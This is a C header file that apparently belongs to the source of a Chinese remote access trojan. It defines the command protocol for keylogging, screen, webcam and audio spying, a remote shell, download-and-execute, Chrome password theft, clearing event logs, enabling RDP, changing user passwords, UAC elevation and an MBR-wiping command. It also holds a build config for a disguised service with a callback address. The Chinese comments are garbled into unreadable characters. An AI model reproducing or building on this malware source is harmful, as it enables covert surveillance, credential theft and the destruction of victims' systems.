#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 1,    	// һ��,������ػ���Զ���Ѿ��У�ȡ��
		TRANSFER_MODE_ADDITION,			// ׷��
		TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
		TRANSFER_MODE_OVERWRITE,		// ����
		TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
		TRANSFER_MODE_JUMP,				// ����
		TRANSFER_MODE_JUMP_ALL,			// ȫ������
		TRANSFER_MODE_CANCEL,			// ȡ������
};
enum
{
	COMMAND_LIST_FILES = 1,			// �г�Ŀ¼�е��ļ�
		COMMAND_DOWN_FILES,				// �����ļ�
		COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
		COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
		COMMAND_CONTINUE,				// �������������������������
		COMMAND_STOP,					// ������ֹ
		COMMAND_DELETE_FILE,			// ɾ���ļ�
		COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
		COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
		COMMAND_CREATE_FOLDER,			// �����ļ���
		COMMAND_RENAME_FILE,			// �ļ����ļ�����
		COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
		COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
		COMMAND_FILES_SEARCH_START,     // �����ļ�
		COMMAND_FILES_SEARCH_STOP,      // ֹͣ����
		COMMAND_MOVE_DIRECTORY,         // �ƶ��ļ���
		COMMAND_MOVE_FILE,              // �ƶ��ļ�
		
		
		TOKEN_FILE_LIST,				// �ļ��б�
		TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
		TOKEN_FILE_DATA,				// �ļ�����
		TOKEN_TRANSFER_FINISH,			// �������
		TOKEN_DELETE_FINISH,			// ɾ�����
		TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
		TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
		TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
		TOKEN_DATA_CONTINUE,			// ������������
		TOKEN_RENAME_FINISH,			// �����������
		TOKEN_SEARCH_FILE_LIST,         // �����������ļ�
		TOKEN_SEARCH_FILE_FINISH,       // ȫ���������
		TOKEN_MOVE_FINISH,
		TOKEN_COMPRESS_FINISH,
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_SCREEN_RESET = 1,			// �ı���Ļ���
		COMMAND_AERO_DISABLE,			// ��������ϳ�(Aero)
		COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
		COMMAND_ALGORITHM_RESET,		// �ı��㷨
		COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
		COMMAND_SCREEN_CONTROL,			// ��Ļ����
		COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
		COMMAND_SCREEN_BLANK,			// ����˺���
		COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
		COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
		COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����
		
		
		TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
		TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
		TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ��������� 
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_PSLIST = 1,					// �����б�
		COMMAND_WSLIST,					// �����б�
		COMMAND_SSLIST,                 // �û���Ϣ
		COMMAND_USLIST,                 // ϵͳ�û�
		COMMAND_ASLIST,                 // �û�״̬
		COMMAND_DSLIST,                 // ��������
		COMMAND_SOFTWARELIST,           // ����б�

		COMMAND_KILLPROCESS,			// �رս���
		COMMAND_KILLPROCESS_WINDOW,     // �رս���(����)
		COMMAND_WINDOW_TEST,            // �������ء���ԭ����󻯡���С��
		COMMAND_WINDOW_CLOSE,           // ���ڹر�

		COMMAND_ACITVEUSER,             // �����û�
		COMMAND_DISABLEEUSER,           // �����û�
		COMMAND_NET_USER,               // ��net����û�
		COMMAND_CHANGE_USERPASS,        // �����û�����
		COMMAND_DELUSER,                // ɾ���û�

		COMMAND_DISCONNECTUSER,         // �Ͽ��û�
		COMMAND_LOGOFF_USER,            // ע���û�

		COMMAND_3389_PORT,              // ����3389�˿�
		COMMAND_OPEN_3389,              // ����3389
		COMMAND_SEND_TERMSRV,           // ����˫��3389�ļ�

		COMMAND_S_SESSION,              // �Ự����
		
		COMMAND_IHLIST,                 // IE ��ʷ��¼
		COMMAND_FULIST,					//IE�ղؼ�
		COMMAND_NSLIST,					//��������״̬
		COMMAND_APPUNINSTALL,			//����ж��
		
		COMMAND_NETWORK,				//����MAC��ַ
		COMMAND_HOSTS,					//Host�ļ�
		COMMAND_RUN,					//������
		
		COMMAND_PROCESSFREEZING,		//���̽ⶳ
		COMMAND_PROCESSTHAWING,			//���̶���
		//
		TOKEN_WSLIST,					// �����б�
		TOKEN_SSLIST,                   // ϵͳ��Ϣ
		TOKEN_USLIST,                   // ϵͳ�û�
		TOKEN_ASLIST,                   // �û�״̬
		TOKEN_DIALUPASS,                // ��������
		TOKEN_SOFTWARE,                 // �����Ϣ
		
		TOKEN_CPUMEMORY,                // cpu �ڴ�ʹ����
		TOKEN_CHANGE_PSAA_SUCCESS,      // �����û�����ɹ�
		TOKEN_GET_TERMSRV,              // XPϵͳ��ȡ˫��3389�ļ�
		TOKEN_TERMSRV_OK,               // ˫��3389�ɹ�
		
		TOKEN_IHLIST,                   // IE��ʷ��¼
		TOKEN_FULIST,					//IE�ղؼ�
		TOKEN_NSLIST,					//��������״̬
		TOKEN_HOSTS,					//Host�ļ�
		TOKEN_NETWORK,					//����MAC
		TOKEN_RUN,						//������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_WEBCAM_RESIZE = 1,    		// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	TOKEN_WEBCAM_DIB,			    	// ����ͷ��ͼ������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_DELETESERVERICE = 100,       // ɾ������
	COMMAND_STARTSERVERICE,              // ��������
	COMMAND_STOPSERVERICE,               // ֹͣ����
	COMMAND_PAUSESERVERICE,              // ��ͣ����
	COMMAND_CONTINUESERVERICE,           // ��������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_REG_ENUM = 1,                 // ö��ע���
		COMMAND_REG_CREATEKEY,            // ����·��
		COMMAND_REG_DELKEY,               // ɾ��·��
		COMMAND_REG_CREATKEY,             // ������
		COMMAND_REG_DELVAL,               // ɾ����
		
		TOKEN_REG_INFO,                   // ע�����Ϣ
		TOKEN_REG_SUCCEED,                // ע���ɹ�
		TOKEN_REG_ERROR,                  // ע������
		TOKEN_REG_KEY,                    // ��ֵ����
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_AUDIO_DATE = 1,             // ���ͱ�����������
		COMMAND_AUDIO_CHANGER,          // ���������豸
		COMMAND_AUDIO_CHANGER_LINES,    // ������������
		
		TOKEN_AUDIO_DATA,               // ��Ƶ����
		TOKEN_AUDIO_CHANGE_FINISH,      // �����ɹ�
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_KEYBOARD_OFFLINE = 1,		// �������߼��̼�¼
		COMMAND_SEND_KEYBOARD,          // ��ȡ���̼�¼����
		COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
		COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
		TOKEN_KEYBOARD_DATA,			// ���̼�¼������
		COMMAND_KEYBOARD_OLKEYLOG,		// ���߼�¼
		COMMAND_KEYBOARD_OLKEYLOG_OFF,	// �ر����߼�¼	
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	CLEAN_EVENT_ALL = 1, //������־
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_PROXY_CONNECT= 1, //socket5����
		COMMAND_PROXY_CLOSE,
		COMMAND_PROXY_DATA,

		TOKEN_PROXY_CONNECT_RESULT,
		TOKEN_PROXY_CLOSE,
		TOKEN_PROXY_DATA,
		TOKEN_PROXY_BIND_RESULT
};
//////////////////////////////////////////////////////////////////////////
enum
{
	// ���ƶ˷���������

	COMMAND_SESSION = 0,			// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_UNINSTALL,              // ж��
	COMMAND_RENAME_REMARK,          // ���ı�ע
	COMMAND_CHANGE_GROUP,           // ���ķ���
	COMMAND_CLEAN_EVENT,            // ������־
		
	// ��������
	COMMAND_DOWN_EXEC,              // ����ִ��
	COMMAND_DOWN_UPDATE,            // ���ظ���
	COMMAND_START,                  	//д������
	COMMAND_OPEN_URL_SHOW,          // ����ҳ����ʾ��
	COMMAND_OPEN_URL_HIDE,          // ����ҳ�����أ�
	COMMAND_LOCAL_UPLOAD,           // �����ϴ�
	COMMAND_LOCAL_UPLOAD1,          // UAC
	COMMAND_LOCAL_UPLOAD2,          // UAC2
	COMMAND_MESSAGEBOX,             // Messagebox
		
	// ɸѡ
	COMMAND_FIND_PROCESS,           // ���ҽ���
	COMMAND_FIND_WINDOW,            // ���Ҵ���
	
	COMMAND_OPEN_PROXY,             // ��������
	COMMAND_CLOSE_PROXY,            // �رմ���
	COMMAND_PRANK,                  // �� �� ��

	// ��Ҫ����
	COMMAND_NEXT = 100,				// ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_LIST_DRIVE,	            // �ļ�����(�г�����Ŀ¼) 
	COMMAND_SCREEN_SPY,				// ��Ļ���
	COMMAND_WEBCAM,					// ����ͷ���
	COMMAND_AUDIO,                  // ��������
	COMMAND_SHELL,					// cmdshell
	COMMAND_SYSTEM,                 // ϵͳ����
	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_SERVICE_MANAGER,	    // �������	
	COMMAND_REGEDIT,                // ע �� ��
	COMMAND_TEXT_CHAT,              // ��������
	COMMAND_PROXY_MAP,				// proxy

	COMMAND_NEXT1,					// ��һ��(���ƶ���
	COMMAND_SCREEN_SPY1,			// ��Ļ�鿴
	COMMAND_SCREEN_RESET1,
	COMMAND_ALGORITHM_RESET1,
	COMMAND_WIN7BASIC1,
	COMMAND_SCREEN_CTRL_ALT_DEL1,
	COMMAND_SCREEN_BLOCK_INPUT1,
	COMMAND_SCREEN_BLANK1,
	COMMAND_SCREEN_CAPTURE_LAYER1,
	COMMAND_SCREEN_GET_CLIPBOARD1,
	COMMAND_SCREEN_CONTROL1,
	COMMAND_SCREEN_SET_CLIPBOARD1,

	//����
	COMMAND_PRANK_CONTROL,
	COMMAND_KILLMBR,				// Ӳ����
	COMMAND_GUANGQU1,				// �򿪹���
	COMMAND_GUANGQU2,				// �ջع���
	COMMAND_ZHUOMIAN1,				// ��������
	COMMAND_ZHUOMIAN2,				// ��ʾ����
	COMMAND_ZAOYIN,					// ����
	COMMAND_SHANPIN,				// ����
	COMMAND_XIANSHIQI1,				// �ر���ʾ��
	COMMAND_XIANSHIQI2,				// ����ʾ��
	COMMAND_RENWULAN1,				// ����������
	COMMAND_RENWULAN2,				// ��ʾ������
	COMMAND_MOUSE1,				    // ������һ���
	COMMAND_MOUSE2,				    // ��껥���ر�
	// Ԥ�� 
	COMMAND_CHAT,                   //���а�
	COMMAND_CHAT_CLOSE,
	COMMAND_Screen, 
	COMMAND_FILEATTR,				//�ļ�����
	COMMAND_OnElevate_Privileges,   //WIN7����Ȩ��
	COMMAND_CHROME_INFO,			//����GOOGLE������˺�����
	COMMAND_ReStart_Exp,            //����Exp
	COMMAND_ReStart_ieqc,           //����Exp
	COMMAND_ReStart_ieqc1,          //����Exp
	COMMAND_ReStart_ieqc2,          //����Exp
	COMMAND_ReStart_ieqc3,          //����Exp
	COMMAND_ReStart_ieqc4,          //����Exp
	COMMAND_ReStart_ieqc5,          //����Exp
	COMMAND_ReStart_ieqc6,          //����Exp
	COMMAND_ReStart_ieqc7,          //����Exp
	COMMAND_ReStart_ieqc8,          //����Exp
	COMMAND_ReStart_ieqc9,          //����Exp          
	COMMAND_PLUGINME,
	COMMAND_NWCB,                   //��������

/////////////////////////////////////////////////////////////////////////////////////////

	// ����˷����ı�ʶ
	TOKEN_LOGIN = 200,				// ���߰�
	TOKEN_DRIVE_LIST,				// �ļ������������б�
	TOKEN_BITMAPINFO,				// ��Ļ��أ���Ļ�鿴��BITMAPINFO��
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ������ͷ��BITMAPINFOHEADER��
	TOKEN_SHELL_START,              // CMD
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_PSLIST,					// �����б�
	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_SERVICE_LIST,             // �����б�
	TOKEN_REGEDIT,                  // ע���ʼ
	TOKEN_TEXTCHAT_START,           // �������쿪ʼ
	TOKEN_PROXY_START,              // ����ӳ�俪ʼ

	// ����	
	TOKEN_FIND_YES,                 // ���Ҵ���
	TOKEN_FILEATTR,					// �ļ�����

	// Ԥ��
	TOKEN_CHROME_INFO,              // ������˺�������Ϣ
	TOKEN_CHAT_START,               // ���а�

	TOKEN_BITMAPINFO1,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN1,
	TOKEN_NEXTSCREEN1,
    TOKEN_CLIPBOARD_TEXT1,
};
struct DLL_INFO
{
	char LoginAddr[30];     // ���ߵ�ַ 1  
	UINT LoginPort;         // ���߶˿� 2
	WORD FileAttribute;     // �ļ����� 3
	char UpGroup[30];       // ���߷��� 4
	char ConnetPass[20];    // ͨѶ��Կ 5
	TCHAR ReleaseName[25];  // ��װ���� 6
	char ServiceName[70];   // �������� 7
	char ServiceDisplayName[70]; // ������ʾ 8
	char ServiceDescription[120];// �������� 9
	char ReleasePath[100];  // ��װ·�� 10
	CHAR szDownRun[150];    // �����ַ 11
	char Dele_zc;           // �������� 12
	BOOL Fwb;               // ΢�� 13
	BOOL Fhb;               // ���� 14
	BOOL Fxn;               // ���� 15
	BOOL Ffx;               // ���� 16
	BOOL Fsc;               // ��ɾ 17
	BOOL Fzs;               // ��ɾ 18
	BOOL Fcf;               // �ظ� 19
	BOOL Ffh;               // ���� 20
	BOOL Fct;               // ��͸ 21
	BOOL Fzj;               // �ս� 22
	BOOL Fkb;               // ���� 23
	BOOL Fsm;               // ˯�� 24
	BOOL Flx;               // ���� 25
	BOOL Fwr;               // ΢�� 26
};
typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[30];	// ���߷���
	IN_ADDR	    	IPAddress;	    // �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwMajorVer;		// ϵͳ���汾
	DWORD			dwMinorVer;		// ϵͳ�ΰ汾
	DWORD			dwBuildNumber;	// ϵͳBuild�汾
	char			CPUClockMhz[20];// CPU��Ϣ
	DWORD			dwSpeed;		// ����
	UINT			bIsWebCam;		// �Ƿ�������ͷ
	UINT			Mining;
	bool            bIsWow64;
	DWORD           dwMemSize;
	char            szInstallTime[50]; //��װʱ��
	char			lpColor[20];     //��ɫ
	char			Virus[80];		// ɱ�����
	char			TG[40];		// �ɻ�
	char			WX[40];		// ΢��
	////////
	char			szGraphics[128];	//�Կ�
	DWORD			Memory7;			//�Դ�
	char			szQQNum[32];	// ��½QQ
	BOOL			bIsActive;	    // �û�״̬
	char			szLionPass[20]; //����ͨѶ��Կ
	char			Pattern[50];	// ����ģʽ
	char            Admin[64];      //ӵ��Ȩ��
	/////////
}LOGININFO;
enum CHROME_MSG
{
	CHROME_SUCCESS = 0,
	CHROME_UNKNOW,
	CHROME_KEY_NOTFOUND,//Key�ļ�������
	CHROME_DB_NOTFOUND,//chrome login data�ļ�������
	CHROME_OPENDB_FAILED,//login data��ʧ�ܣ�����ûȨ��֮���
	CHROME_NO_DATA,//������û����
	CHROME_DECODEKEY_FAILED,//��Կ����ʧ��
};
#define	MAX_WRITE_RETRY		15		// ����д���ļ�����
#define MAX_SEND_BUFFER		2048*200	// ��������ݳ���(�ٶȿɴﵽ50Mbps)
#define	MAX_RECV_BUFFER		2048*200 // ���������ݳ���(�ٶȿɴﵽ50Mbps)
#endif // !defined(AFX_MACROS_H_INCLUDED)